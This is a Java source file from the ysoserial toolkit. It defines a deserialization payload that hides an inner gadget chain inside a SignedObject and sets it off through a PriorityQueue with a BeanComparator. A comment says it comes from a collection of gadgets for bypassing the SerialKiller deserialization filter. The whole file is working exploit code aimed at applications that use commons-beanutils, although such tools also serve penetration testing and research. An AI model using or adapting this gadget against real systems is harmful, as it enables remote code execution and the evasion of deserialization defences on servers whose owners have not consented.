package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;

import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.util.Serializables;

import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.Signature;
import java.security.SignedObject;
import java.util.PriorityQueue;

// From Alvaro's stuff here: 
// https://github.com/pwntester/SerialKillerBypassGadgetCollection/blob/master/src/main/java/serialkiller/bypass/Beanutils1.java
@Dependencies({ "commons-beanutils:commons-beanutils:1.0"} )
public class BeanUtilsWrapper1 implements ObjectPayload<Object> {
	
	@Bind private ObjectPayload<?> inner;

	public Object getObject(String command) throws Exception {
		return getObject();
	}

	public Object getObject() throws Exception {

	        byte[] payload_bytes = Serializables.serialize(inner.getObject());
	        Signature signature = Signature.getInstance("SHA1withDSA");
	        PrivateKey privateKey = KeyPairGenerator.getInstance("DSA", "SUN").genKeyPair().getPrivate();
	        SignedObject signedObject = new SignedObject("", privateKey, signature);
	        Reflections.setFieldValue(signedObject, "content", payload_bytes);

	        BeanComparator<Object> comparator = new BeanComparator<Object>("lowestSetBit");
	        Reflections.setFieldValue(comparator, "property", "object");

	        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
	        Object[] queue = new Object[] {signedObject, signedObject};
	        Reflections.setFieldValue(priorityQueue, "queue", queue);
	        Reflections.setFieldValue(priorityQueue, "size", 2);

	        return priorityQueue;

	}

	
	
}
